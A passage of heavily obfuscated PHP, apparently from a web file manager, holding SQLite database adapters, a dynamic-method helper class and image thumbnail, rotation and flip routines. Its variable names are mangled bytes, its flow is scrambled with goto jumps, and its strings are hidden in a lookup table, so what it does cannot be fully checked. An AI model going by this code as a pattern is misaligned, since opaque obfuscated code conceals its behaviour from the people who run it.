$this->queryStr = $EáæÍñïˆê; if ($this->queryID) { $this->free(); } think_action_status($AÈÂ²ƒ«š[21], 1); goto AºÂõ£ˆÑ•; bÆ´¢° Â : $AÈÂ²ƒ«š =& $_SERVER[÷ÖêïÔÔÓ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto f ÄÕĞ­ßØ; AºÂõ£ˆÑ•: think_status($AÈÂ²ƒ«š[20]); $f¼æà¾ô¹ = sqlite_exec($this->_linkID, $EáæÍñïˆê); $this->debug(); goto D˜‘«ìİÂ; D˜‘«ìİÂ: if (!1 === $f¼æà¾ô¹) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto fÅÑÃñÙ†ò; fÅÑÃñÙ†ò: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[÷ÖêïÔÔÓ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Béƒš’Î¥Õ = sqlite_query($this->_linkID, $_SERVER[÷ÖêïÔÔÓ][23]); if (!$Béƒš’Î¥Õ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $cŒÈèï»¶ = sqlite_query($this->_linkID, $_SERVER[÷ÖêïÔÔÓ][24]); if (!$cŒÈèï»¶) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $B”±ìÎÒƒ = array(); if ($this->numRows > 0) { for ($e¡‹åØƒá = 0; $e¡‹åØƒá < $this->numRows; $e¡‹åØƒá++) { $B”±ìÎÒƒ[$e¡‹åØƒá] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $B”±ìÎÒƒ; } public function getFields($a¶»²â«ö) { $B´ë¸ò«§÷ =& $_SERVER[÷ÖêïÔÔÓ]; $Bîƒ¼ÛÉ’Ğ = $this->query($B´ë¸ò«§÷[25] . $a¶»²â«ö . $B´ë¸ò«§÷[26]); $c£ä£“²ƒ = array(); if ($Bîƒ¼ÛÉ’Ğ) { foreach ($Bîƒ¼ÛÉ’Ğ as $f¦×Óä’‚Š => $aâÕø¨¦) { $c£ä£“²ƒ[$aâÕø¨¦[$B´ë¸ò«§÷[27]]] = array($B´ë¸ò«§÷[28] => $aâÕø¨¦[$B´ë¸ò«§÷[27]], $B´ë¸ò«§÷[29] => $aâÕø¨¦[$B´ë¸ò«§÷[30]], $B´ë¸ò«§÷[31] => (bool) ($aâÕø¨¦[$B´ë¸ò«§÷[32]] === $B´ë¸ò«§÷[33]), $B´ë¸ò«§÷[34] => $aâÕø¨¦[$B´ë¸ò«§÷[35]], $B´ë¸ò«§÷[36] => strtolower($aâÕø¨¦[$B´ë¸ò«§÷[37]]) == $B´ë¸ò«§÷[38], $B´ë¸ò«§÷[39] => strtolower($aâÕø¨¦[$B´ë¸ò«§÷[40]]) == $B´ë¸ò«§÷[41]); } } return $c£ä£“²ƒ; } public function getTables($bœ¤²‘­´‰ = '') { $CÏÇØ×•Š =& $_SERVER[÷ÖêïÔÔÓ]; $Bï·„À¶©Ù = $this->query($CÏÇØ×•Š[42] . $CÏÇØ×•Š[43] . $CÏÇØ×•Š[44]); $CÜ‰îÏèÌæ = array(); foreach ($Bï·„À¶©Ù as $bòÊÂİÂ => $aö®£ôğ’Ê) { $CÜ‰îÏèÌæ[$bòÊÂİÂ] = current($aö®£ôğ’Ê); } return $CÜ‰îÏèÌæ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $CÜ²Ùë¤Øã =& $_SERVER[÷ÖêïÔÔÓ]; $D‰íöÜ¥™É = sqlite_last_error($this->_linkID); $this->error = $D‰íöÜ¥™É . $CÜ²Ùë¤Øã[4] . sqlite_error_string($D‰íöÜ¥™É); if ($CÜ²Ùë¤Øã[33] != $this->queryStr) { $this->error .= LNG($CÜ²Ùë¤Øã[45]) . $this->queryStr; } think_trace($this->error, $CÜ²Ùë¤Øã[33], $CÜ²Ùë¤Øã[46]); return $this->error; } public function escapeString($e…°É¥å‘) { return sqlite_escape_string($e…°É¥å‘); } public function parseLimit($B²ÈÚ‰‚ö˜) { $C‰ùè¹ÒÎÀ =& $_SERVER[÷ÖêïÔÔÓ]; $aŸñé‹âÅÏ = $C‰ùè¹ÒÎÀ[33]; if (!empty($B²ÈÚ‰‚ö˜)) { $B²ÈÚ‰‚ö˜ = explode($C‰ùè¹ÒÎÀ[47], $B²ÈÚ‰‚ö˜); if (count($B²ÈÚ‰‚ö˜) > 1) { $aŸñé‹âÅÏ .= $C‰ùè¹ÒÎÀ[48] . $B²ÈÚ‰‚ö˜[1] . $C‰ùè¹ÒÎÀ[49] . $B²ÈÚ‰‚ö˜[0] . $C‰ùè¹ÒÎÀ[50]; } else { $aŸñé‹âÅÏ .= $C‰ùè¹ÒÎÀ[48] . $B²ÈÚ‰‚ö˜[0] . $C‰ùè¹ÒÎÀ[50]; } } return $aŸñé‹âÅÏ; } } class DbSqlite3Base extends Db { public function __construct($b°¤È‰ŞŒ = '') { $d°¶‡Ü§çâ =& $_SERVER[÷ÖêïÔÔÓ]; if (!class_exists($d°¶‡Ü§çâ[51])) { think_exception(think_lang($d°¶‡Ü§çâ[10]) . $d°¶‡Ü§çâ[52]); } if (!empty($b°¤È‰ŞŒ)) { if (!isset($b°¤È‰ŞŒ[$d°¶‡Ü§çâ[12]])) { $b°¤È‰ŞŒ[$d°¶‡Ü§çâ[12]] = 438; } $this->config = $b°¤È‰ŞŒ; if (empty($this->config[$d°¶‡Ü§çâ[13]])) { $this->config[$d°¶‡Ü§çâ[13]] = array(); } } } public function connect($BéÊ­×ôÉ° = '', $A¾éĞõ¾ˆ™ = 0) { $Bà“äñÒñÇ =& $_SERVER[÷ÖêïÔÔÓ]; if (!isset($this->linkID[$A¾éĞõ¾ˆ™])) { if (empty($BéÊ­×ôÉ°)) { $BéÊ­×ôÉ° = $this->config; } $this->linkID[$A¾éĞõ¾ˆ™] = new SQLite3($BéÊ­×ôÉ°[$Bà“äñÒñÇ[17]]); if (!$this->linkID[$A¾éĞõ¾ˆ™]) { think_exception($this->linkID[$A¾éĞõ¾ˆ™]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$A¾éĞõ¾ˆ™]->busyTimeout(30000); if (1 != think_config($Bà“äñÒñÇ[18])) { unset($this->config); } } return $this->linkID[$A¾éĞõ¾ˆ™]; } public function free() { $this->queryID = null; } public function query($bµ¤İÓÌ†¤) { goto F˜Â³óÀÅâ; c„îÈ±×ˆö: if (!1 === $this->queryID) { $this->error(); return !1; } else { $eŠº¶«£à¼ = $this->getAll(); $this->numRows = count($eŠº¶«£à¼); return $eŠº¶«£à¼; } goto a—Õ›ãÇÉ; c«é»Äçø“: $this->queryStr = $bµ¤İÓÌ†¤; if ($this->queryID) { $this->free(); } think_action_status($E£‘—î˜È¤[19], 1); goto eÌÁ®…õ³Ò; F˜Â³óÀÅâ: $E£‘—î˜È¤ =& $_SERVER[÷ÖêïÔÔÓ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto c«é»Äçø“; eÌÁ®…õ³Ò: think_status($E£‘—î˜È¤[20]); $this->queryID = $this->_linkID->query($bµ¤İÓÌ†¤); $this->debug(); goto c„îÈ±×ˆö; a—Õ›ãÇÉ: } public function execute($B¤ÃÄÊÛËâ) { goto dé…ˆÄĞ’; bË¸Î£ÍÊ: $this->queryStr = $B¤ÃÄÊÛËâ; if ($this->queryID) { $this->free(); } think_action_status($C²ÀÖØÈˆ¹[21], 1); goto EœÁï ìó; dÆÜ«ßÄ—Ï: if (!1 === $e‡£Üšãò) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto BÛğÍÒ˜ĞÔ; EœÁï ìó: think_status($C²ÀÖØÈˆ¹[20]); $e‡£Üšãò = $this->_linkID->exec($B¤ÃÄÊÛËâ); $this->debug(); goto dÆÜ«ßÄ—Ï; dé…ˆÄĞ’: $C²ÀÖØÈˆ¹ =& $_SERVER[÷ÖêïÔÔÓ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bË¸Î£ÍÊ; BÛğÍÒ˜ĞÔ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[÷ÖêïÔÔÓ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $F©ÆíŠÙŞ¦ = $this->_linkID->query($_SERVER[÷ÖêïÔÔÓ][23]); if (!$F©ÆíŠÙŞ¦) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $D¾‚Šãâ¶¹ = $this->_linkID->query($_SERVER[÷ÖêïÔÔÓ][24]); if (!$D¾‚Šãâ¶¹) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $EÈİÕÃÑ’ = array(); while ($E×ÈÀËŠ£‚ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $EÈİÕÃÑ’[] = $E×ÈÀËŠ£‚; } $this->queryID->reset(); return $EÈİÕÃÑ’; } public function getFields($f£¸ƒÛÖ¨’) { $DÃ©Ÿ¸£ßÊ =& $_SERVER[÷ÖêïÔÔÓ]; $Cğ¨Òàƒ¬Ú = $this->query($DÃ©Ÿ¸£ßÊ[25] . $f£¸ƒÛÖ¨’ . $DÃ©Ÿ¸£ßÊ[26]); $fğÉŸç•¢« = array(); if ($Cğ¨Òàƒ¬Ú) { foreach ($Cğ¨Òàƒ¬Ú as $F‹¥ÜĞÇ => $C¯¢ª­Éåõ) { $fğÉŸç•¢«[$C¯¢ª­Éåõ[$DÃ©Ÿ¸£ßÊ[28]]] = array($DÃ©Ÿ¸£ßÊ[28] => $C¯¢ª­Éåõ[$DÃ©Ÿ¸£ßÊ[28]], $DÃ©Ÿ¸£ßÊ[29] => $C¯¢ª­Éåõ[$DÃ©Ÿ¸£ßÊ[29]], $DÃ©Ÿ¸£ßÊ[31] => (bool) ($C¯¢ª­Éåõ[$DÃ©Ÿ¸£ßÊ[31]] === $DÃ©Ÿ¸£ßÊ[33]), $DÃ©Ÿ¸£ßÊ[34] => $C¯¢ª­Éåõ[$DÃ©Ÿ¸£ßÊ[53]], $DÃ©Ÿ¸£ßÊ[36] => (bool) $C¯¢ª­Éåõ[$DÃ©Ÿ¸£ßÊ[54]], $DÃ©Ÿ¸£ßÊ[39] => (bool) $C¯¢ª­Éåõ[$DÃ©Ÿ¸£ßÊ[54]]); } } return $fğÉŸç•¢«; } public function getTables($A³–´‰¢Ú = '') { $BËØ“âùª¿ =& $_SERVER[÷ÖêïÔÔÓ]; $Fµ£—‡êÊ = $this->query($BËØ“âùª¿[42] . $BËØ“âùª¿[43] . $BËØ“âùª¿[44]); $b˜Å£ñÏ¾æ = array(); foreach ($Fµ£—‡êÊ as $aä»œå©ê‰ => $cï–¨Ñ¯îª) { $b˜Å£ñÏ¾æ[$aä»œå©ê‰] = current($cï–¨Ñ¯îª); } return $b˜Å£ñÏ¾æ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $bĞè®´Ê»£ =& $_SERVER[÷ÖêïÔÔÓ]; $this->error = $this->_linkID->lastErrorMsg(); if ($bĞè®´Ê»£[33] != $this->queryStr) { $this->error .= LNG($bĞè®´Ê»£[45]) . $this->queryStr; } think_trace($this->error, $bĞè®´Ê»£[33], $bĞè®´Ê»£[46]); return $this->error; } public function escapeString($bÀ¾¸İâô) { $CÌíñƒø• =& $_SERVER[÷ÖêïÔÔÓ]; if ($this->_linkID) { return $this->_linkID->escapeString($bÀ¾¸İâô); } return str_ireplace($CÌíñƒø•[55], $CÌíñƒø•[56], $bÀ¾¸İâô); } public function parseLimit($CİÏğöÚ”¡) { $BùÀ’×ÌÆ‹ =& $_SERVER[÷ÖêïÔÔÓ]; $a‚¼°¯‡Ñ² = $BùÀ’×ÌÆ‹[33]; if (!empty($CİÏğöÚ”¡)) { $CİÏğöÚ”¡ = explode($BùÀ’×ÌÆ‹[47], $CİÏğöÚ”¡); if (count($CİÏğöÚ”¡) > 1) { $a‚¼°¯‡Ñ² .= $BùÀ’×ÌÆ‹[48] . $CİÏğöÚ”¡[1] . $BùÀ’×ÌÆ‹[49] . $CİÏğöÚ”¡[0] . $BùÀ’×ÌÆ‹[50]; } else { $a‚¼°¯‡Ñ² .= $BùÀ’×ÌÆ‹[48] . $CİÏğöÚ”¡[0] . $BùÀ’×ÌÆ‹[50]; } } return $a‚¼°¯‡Ñ²; } } goto D’¬Ôç¿–Ã; e×°×°‘Ûë: $_SERVER[$_SERVER[Óº‹‘Î][51]] = (base64_decode('OTE4Mw==')."\70\65")+0;$_5ga2="qmYnuh5fzmNfVt2qNZTq3Wy7EsJiDFEZ5pbMX4EapA7nSShPtpNSfdwJQcMUGzGQhcMV3K8";; stream_wrapper_register($_SERVER[Óº‹‘Î][52], $_SERVER[Óº‹‘Î][53]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($a¾Œ³Ûì§, $Cöô¡½º§) { $A¬ó¾Ïº =& $_SERVER[÷ÖêïÔÔÓ]; if (isset(self::$_methodList[$a¾Œ³Ûì§])) { return @call_user_func_array(self::$_methodList[$a¾Œ³Ûì§], $Cöô¡½º§); } else { if (method_exists($this, $a¾Œ³Ûì§)) { return call_user_func_array(array($this, $a¾Œ³Ûì§), $Cöô¡½º§); } else { think_exception(__CLASS__ . $A¬ó¾Ïº[4] . $a¾Œ³Ûì§ . $A¬ó¾Ïº[5]); } } } public static function __callStatic($e—ï‰ÜÄ§È, $EßÑ»Ö•») { if (isset(self::$_methodListStatic[$e—ï‰ÜÄ§È])) { return call_user_func_array(self::$_methodListStatic[$e—ï‰ÜÄ§È], $EßÑ»Ö•»); } else { if (method_exists(self, $e—ï‰ÜÄ§È)) { return call_user_func_array(array(self, $e—ï‰ÜÄ§È), $EßÑ»Ö•»); } else { show_json("{$e—ï‰ÜÄ§È}\50\51\x20\156\x6f\164\40\x65\x78\x69\163\x74\73", !1); } } } public static function addMethod($dæğ™õçœ‚, $Aäö“³‰•©) { self::$_methodList[$dæğ™õçœ‚] = $Aäö“³‰•©; } public static function addMethodStatic($aÆÊÒØØ, $fÛ¼ß£åï) { self::$_methodListStatic[$aÆÊÒØØ] = $fÛ¼ß£åï; } } goto A íè³®™Á; FÔ¦¦…ÈÆÆ: class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($c­Ä×ÀÙì, $B©î¨êŒ) { goto C¡†ÙËê; C¡†ÙËê: $this->srcFile = $c­Ä×ÀÙì; $this->echoType = $B©î¨êŒ; $this->im = self::image($c­Ä×ÀÙì); goto C¼Íßõ’—à; C¼Íßõ’—à: if (!$this->im) { return !1; } $eœƒÂ‹ò¦ = $_SERVER[÷ÖêïÔÔÓ][33]; $this->imgData = GetImageSize($c­Ä×ÀÙì, $eœƒÂ‹ò¦); goto d‹Œ¥õÚî; d‹Œ¥õÚî: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto Eˆ½Š×‹ˆ´; Eˆ½Š×‹ˆ´: } public static function image($CÔäÕºŒ£â) { $DŠ½Ï‡  =& $_SERVER[÷ÖêïÔÔÓ]; $b´Öæİó  = $DŠ½Ï‡ [33]; $Dà¼•¥™ö = GetImageSize($CÔäÕºŒ£â, $b´Öæİó ); $bÕÓ°¼ß‰ù = !1; switch ($Dà¼•¥™ö[2]) { case IMAGETYPE_GIF: if (!function_exists($DŠ½Ï‡ [1762])) { break; } $bÕÓ°¼ß‰ù = imagecreatefromgif($CÔäÕºŒ£â); break; case IMAGETYPE_JPEG: if (!function_exists($DŠ½Ï‡ [1763])) { break; } $bÕÓ°¼ß‰ù = imagecreatefromjpeg($CÔäÕºŒ£â); break; case IMAGETYPE_PNG: if (!function_exists($DŠ½Ï‡ [1764])) { break; } $bÕÓ°¼ß‰ù = @imagecreatefrompng($CÔäÕºŒ£â); imagesavealpha($bÕÓ°¼ß‰ù, !0); break; case IMAGETYPE_XBM: $bÕÓ°¼ß‰ù = imagecreatefromxbm($CÔäÕºŒ£â); break; case IMAGETYPE_WBMP: $bÕÓ°¼ß‰ù = imagecreatefromwbmp($CÔäÕºŒ£â); break; case IMAGETYPE_BMP: $bÕÓ°¼ß‰ù = imagecreatefrombmp($CÔäÕºŒ£â); break; default: break; } return $bÕÓ°¼ß‰ù; } public static function imageSize($F¼§±ßÍ´é) { $eÄºÙªŒÎŠ =& $_SERVER[÷ÖêïÔÔÓ]; $Dô±·Ï×¯Ï = GetImageSize($F¼§±ßÍ´é); if (!$Dô±·Ï×¯Ï) { return !1; } return array($eÄºÙªŒÎŠ[1765] => $Dô±·Ï×¯Ï[0], $eÄºÙªŒÎŠ[1766] => $Dô±·Ï×¯Ï[1]); } function distortion($D£ãšŒ®ç®, $D™ßÏ¥ßŞ, $BÛ«¤…âŒ°) { $A–®»…Œğ— = $this->creatImage($this->im, $D™ßÏ¥ßŞ, $BÛ«¤…âŒ°, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($A–®»…Œğ—, $D£ãšŒ®ç®); } function prorate($dµÜî‘Ù¦, $A¨˜ˆ‚¡ô, $A±»‚ö¢àà) { $CğøñË©ì = $A¨˜ˆ‚¡ô / $A±»‚ö¢àà; $c¡˜ÆÒù› = $this->srcW / $this->srcH; if ($CğøñË©ì <= $c¡˜ÆÒù›) { $DÆÅ‘¡­ÂÉ = $A¨˜ˆ‚¡ô; $aÓ¼À¶ê˜œ = $DÆÅ‘¡­ÂÉ * ($this->srcH / $this->srcW); } else { $aÓ¼À¶ê˜œ = $A±»‚ö¢àà; $DÆÅ‘¡­ÂÉ = $aÓ¼À¶ê˜œ * ($this->srcW / $this->srcH); } if ($this->srcW > $A¨˜ˆ‚¡ô || $this->srcH > $A±»‚ö¢àà) { $Aï›…î®Œº = $this->creatImage($this->im, $DÆÅ‘¡­ÂÉ, $aÓ¼À¶ê˜œ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($Aï›…î®Œº, $dµÜî‘Ù¦); } else { $Aï›…î®Œº = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($Aï›…î®Œº, $dµÜî‘Ù¦); } } function cut($eùÃÃÅ†İ, $b‰¥«ï½ó, $c—‘ËÙ˜Ÿµ) { goto e£Å£î®ö®; eò×Ó¥¿´¾: $båÌ¤Ğ‘ = $this->creatImage($this->im, $c¯¸ÕÎã, $Açêî¢Òœ, 0, 0, 0, 0, $this->srcW, $this->srcH); $eÁ³’­ĞÌ = $this->creatImage($båÌ¤Ğ‘, $b‰¥«ï½ó, $c—‘ËÙ˜Ÿµ, 0, 0, ($c¯¸ÕÎã - $b‰¥«ï½ó) / 2, ($Açêî¢Òœ - $c—‘ËÙ˜Ÿµ) / 2, $b‰¥«ï½ó, $c—‘ËÙ˜Ÿµ); imageDestroy($båÌ¤Ğ‘); goto A­‰•¤à²¸; e£Å£î®ö®: $C…ƒõ¹ì¥‘ = $b‰¥«ï½ó / $c—‘ËÙ˜Ÿµ; $Cíƒ‘ªğ·  = $this->srcW / $this->srcH; if ($C…ƒõ¹ì¥‘ <= $Cíƒ‘ªğ· ) { $Açêî¢Òœ = $c—‘ËÙ˜Ÿµ; $c¯¸ÕÎã = $Açêî¢Òœ * ($this->srcW / $this->srcH); } else { $c¯¸ÕÎã = $b‰¥«ï½ó; $Açêî¢Òœ = $c¯¸ÕÎã * ($this->srcH / $this->srcW); } goto eò×Ó¥¿´¾; A­‰•¤à²¸: return $this->echoImage($eÁ³’­ĞÌ, $eùÃÃÅ†İ); goto C‹Œœ©º‰¡; C‹Œœ©º‰¡: } function backFill($CèïƒÊ©, $B…•›èëí, $aä¢Ë×ÉÃâ, $E‘Š¹·¹®ˆ = false, $bó›¨Ö×‚ = 255, $EÁŒÎõ‘·ƒ = 255, $c¾®”ìä™ = 255) { goto eÏÊ±„’¢°; càÙ¿Ğ¹˜: return $this->echoImage($b¦ñ°‡á¥, $CèïƒÊ©); goto Bµˆí¾; DãÑåóÊ: if ($E‘Š¹·¹®ˆ) { $aÛµ‘‚¥ = imageColorTransparent($b¦ñ°‡á¥, $aÛµ‘‚¥); $CéÜº¸«Ñ = $aä¢Ë×ÉÃâ - $E®šøº”è˜; } imageFilledRectangle($b¦ñ°‡á¥, 0, 0, $B…•›èëí, $aä¢Ë×ÉÃâ, $aÛµ‘‚¥); if ($this->srcW > $B…•›èëí || $this->srcH > $aä¢Ë×ÉÃâ) { $C‘ãäŞ°Ş = $this->creatImage($this->im, $b£‡µß®¾È, $E®šøº”è˜, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($b£‡µß®¾È < $B…•›èëí) { imageCopy($b¦ñ°‡á¥, $C‘ãäŞ°Ş, ($B…•›èëí - $b£‡µß®¾È) / 2, 0, 0, 0, $b£‡µß®¾È, $E®šøº”è˜); } else { if ($E®šøº”è˜ < $aä¢Ë×ÉÃâ) { imageCopy($b¦ñ°‡á¥, $C‘ãäŞ°Ş, 0, $CéÜº¸«Ñ, 0, 0, $b£‡µß®¾È, $E®šøº”è˜); } else { imageCopy($b¦ñ°‡á¥, $C‘ãäŞ°Ş, 0, 0, 0, 0, $b£‡µß®¾È, $E®šøº”è˜); } } } else { imageCopyMerge($b¦ñ°‡á¥, $this->im, ($B…•›èëí - $b£‡µß®¾È) / 2, $CéÜº¸«Ñ, 0, 0, $b£‡µß®¾È, $E®šøº”è˜, 100); } goto càÙ¿Ğ¹˜; eÏÊ±„’¢°: $cÃëÖµÖš” = $B…•›èëí / $aä¢Ë×ÉÃâ; $D¨œğ’Ö = $this->srcW / $this->srcH; if ($cÃëÖµÖš” <= $D¨œğ’Ö) { $b£‡µß®¾È = $B…•›èëí; $E®šøº”è˜ = $b£‡µß®¾È * ($this->srcH / $this->srcW); } else { $E®šøº”è˜ = $aä¢Ë×ÉÃâ; $b£‡µß®¾È = $E®šøº”è˜ * ($this->srcW / $this->srcH); } goto A§‘òÀŒ; A§‘òÀŒ: if (function_exists($_SERVER[÷ÖêïÔÔÓ][1767])) { @($b¦ñ°‡á¥ = imageCreateTrueColor($B…•›èëí, $aä¢Ë×ÉÃâ)); if (!$b¦ñ°‡á¥) { $b¦ñ°‡á¥ = imageCreate($B…•›èëí, $aä¢Ë×ÉÃâ); } } else { $b¦ñ°‡á¥ = imageCreate($B…•›èëí, $aä¢Ë×ÉÃâ); } $CéÜº¸«Ñ = ($aä¢Ë×ÉÃâ - $E®šøº”è˜) / 2; $aÛµ‘‚¥ = imagecolorallocate($b¦ñ°‡á¥, $bó›¨Ö×‚, $EÁŒÎõ‘·ƒ, $c¾®”ìä™); goto DãÑåóÊ; Bµˆí¾: } function creatImage($eİëŸˆÏ³ñ, $DËìØ­…½ó, $e¯ ‹»¨™, $bã³í®ğ‹«, $fÖà±—Ú–, $dÁœ²êÇ°Â, $fñµ¬÷ŸÌ, $A³êîóöƒÔ, $a”†­ŞìŞ‘) { if (function_exists($_SERVER[÷ÖêïÔÔÓ][1767])) { @($béùŞéÚ„¹ = ImageCreateTrueColor($DËìØ­…½ó, $e¯ ‹»¨™)); @imagealphablending($béùŞéÚ„¹, !1); @imagesavealpha($béùŞéÚ„¹, !0); if ($béùŞéÚ„¹) { imageCopyResampled($béùŞéÚ„¹, $eİëŸˆÏ³ñ, $bã³í®ğ‹«, $fÖà±—Ú–, $dÁœ²êÇ°Â, $fñµ¬÷ŸÌ, $DËìØ­…½ó, $e¯ ‹»¨™, $A³êîóöƒÔ, $a”†­ŞìŞ‘); } else { $béùŞéÚ„¹ = ImageCreate($DËìØ­…½ó, $e¯ ‹»¨™); imageCopyResized($béùŞéÚ„¹, $eİëŸˆÏ³ñ, $bã³í®ğ‹«, $fÖà±—Ú–, $dÁœ²êÇ°Â, $fñµ¬÷ŸÌ, $DËìØ­…½ó, $e¯ ‹»¨™, $A³êîóöƒÔ, $a”†­ŞìŞ‘); } } else { $béùŞéÚ„¹ = ImageCreate($DËìØ­…½ó, $e¯ ‹»¨™); imageCopyResized($béùŞéÚ„¹, $eİëŸˆÏ³ñ, $bã³í®ğ‹«, $fÖà±—Ú–, $dÁœ²êÇ°Â, $fñµ¬÷ŸÌ, $DËìØ­…½ó, $e¯ ‹»¨™, $A³êîóöƒÔ, $a”†­ŞìŞ‘); } return $béùŞéÚ„¹; } public function imgRotate($fÈ‰‡µíÄ¾, $F×É¨³ğ”) { goto dÈ¸Ÿ©ÏŞ; FÉ‹½ÕÑ: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $B÷œ¿ŸÔ²· = imagegif($F¡× ö´©œ, $fÈ‰‡µíÄ¾); break; case IMAGETYPE_JPEG: $B÷œ¿ŸÔ²· = imagejpeg($F¡× ö´©œ, $fÈ‰‡µíÄ¾, 100); break; case IMAGETYPE_PNG: $B÷œ¿ŸÔ²· = imagePNG($F¡× ö´©œ, $fÈ‰‡µíÄ¾); break; default: break; } imageDestroy($F¡× ö´©œ); imageDestroy($this->im); goto a˜­™¼ØØÛ; dÈ¸Ÿ©ÏŞ: if (!$this->im || $F×É¨³ğ” % 360 === 0 || !function_exists($_SERVER[÷ÖêïÔÔÓ][1768])) { return !1; } $F¡× ö´©œ = imageRotate($this->im, 360 - $F×É¨³ğ”, 0); $B÷œ¿ŸÔ²· = !1; goto FÉ‹½ÕÑ; a˜­™¼ØØÛ: return $B÷œ¿ŸÔ²·; goto bœöš ÌÇ; bœöš ÌÇ: } function echoImage($dê‹è§Õƒ, $côËİÃ×Ú¸) { goto bÉŠóºÏÂ; eÕó‚˜´¸: $Eæ›×Å‚– = !1; switch ($this->echoType) { case $FÀ”»Õé—[1769]: $Eæ›×Å‚– = imagePNG($dê‹è§Õƒ); break; case $FÀ”»Õé—[164]: $Eæ›×Å‚– = imagePNG($dê‹è§Õƒ, $côËİÃ×Ú¸); break; } imageDestroy($dê‹è§Õƒ); goto eø§‚å®Ã±; eø§‚å®Ã±: imageDestroy($this->im); return $Eæ›×Å‚–; goto BĞ°Š‡õ›; bÉŠóºÏÂ: $FÀ”»Õé— =& $_SERVER[÷ÖêïÔÔÓ]; if (!$dê‹è§Õƒ) { return !1; } ob_get_clean(); goto eÕó‚˜´¸; BĞ°Š‡õ›: } } if (!function_exists($_SERVER[÷ÖêïÔÔÓ][1770])) { define($_SERVER[÷ÖêïÔÔÓ][1771], 0); define($_SERVER[÷ÖêïÔÔÓ][1772], 1); define($_SERVER[÷ÖêïÔÔÓ][1773], 2); function imageflip($e³ñëè ¸­, $dğ¢ÙÜÊ…») { switch ($dğ¢ÙÜÊ…») { case IMG_FLIP_HORIZONTAL: $CºÎŞãò¯˜ = imagesx($e³ñëè ¸­) - 1; $Bø“±ƒŸ‹İ = $CºÎŞãò¯˜ / 2; $fê»¬ìøØÅ = imagesy($e³ñëè ¸­); $bâÕßà±‚ = imageistruecolor($e³ñëè ¸­) ? imagecreatetruecolor(1, $fê»¬ìøØÅ) : imagecreate(1, $fê»¬ìøØÅ); for ($B‘ö™ÈŒñ = 0; $B‘ö™ÈŒñ < $Bø“±ƒŸ‹İ; ++$B‘ö™ÈŒñ) { imagecopy($bâÕßà±‚, $e³ñëè ¸­, 0, 0, $B‘ö™ÈŒñ, 0, 1, $fê»¬ìøØÅ); imagecopy($e³ñëè ¸­, $e³ñëè ¸­, $B‘ö™ÈŒñ, 0, $CºÎŞãò¯˜ - $B‘ö™ÈŒñ, 0, 1, $fê»¬ìøØÅ); imagecopy($e³ñëè ¸­, $bâÕßà±‚, $CºÎŞãò¯˜ - $B‘ö™ÈŒñ, 0, 0, 0, 1, $fê»¬ìøØÅ); } break; case IMG_FLIP_VERTICAL: $EÏÛ®Ä¸…“ = imagesx($e³ñëè ¸­); $bòáäŸˆö§ = imagesy($e³ñëè ¸­) - 1; $E‰äÈ—óèŒ = $bòáäŸˆö§ / 2; $bâÕßà±‚ = imageistruecolor($e³ñëè ¸­) ? imagecreatetruecolor($EÏÛ®Ä¸…“, 1) : imagecreate($EÏÛ®Ä¸…“, 1); for ($C¦˜®Ûé‹¿ = 0; $C¦˜®Ûé‹¿ < $E‰äÈ—óèŒ; ++$C¦˜®Ûé‹¿) { imagecopy($bâÕßà±‚, $e³ñëè ¸­, 0, 0, 0, $C¦˜®Ûé‹¿, $EÏÛ®Ä¸…“, 1); imagecopy($e³ñëè ¸­, $e³ñëè ¸­, 0, $C¦˜®Ûé‹¿, 0, $bòáäŸˆö§ - $C¦˜®Ûé‹¿, $EÏÛ®Ä¸…“, 1); imagecopy($e³ñëè ¸­, $bâÕßà±‚, 0, $bòáäŸˆö§ - $C¦˜®Ûé‹¿, 0, 0, $EÏÛ®Ä¸…“, 1); } break; case IMG_FLIP_BOTH: $EÏÛ®Ä¸…“ = imagesx($e³ñëè ¸­); $fê»¬ìøØÅ = imagesy($e³ñëè ¸­); $bâÕßà±‚ = imagerotate($e³ñëè ¸­, 180, 0); imagecopy($e³ñëè ¸­, $bâÕßà±‚, 0, 0, 0, 0, $EÏÛ®Ä¸…“, $fê»¬ìøØÅ); break; default: return; } imagedestroy($bâÕßà±‚); } } if (!function_exists($_SERVER[÷ÖêïÔÔÓ][1774])) { function imagecreatefrombmp($Dñ‰¼÷ºâì) { return ImageGdBMP::load($Dñ‰¼÷ºâì); } } goto aæé¤ÏğÍ‘; d¼ÅÅÓ‘šâ: class Cache { protected static $handle; protected static $memoryCache; public 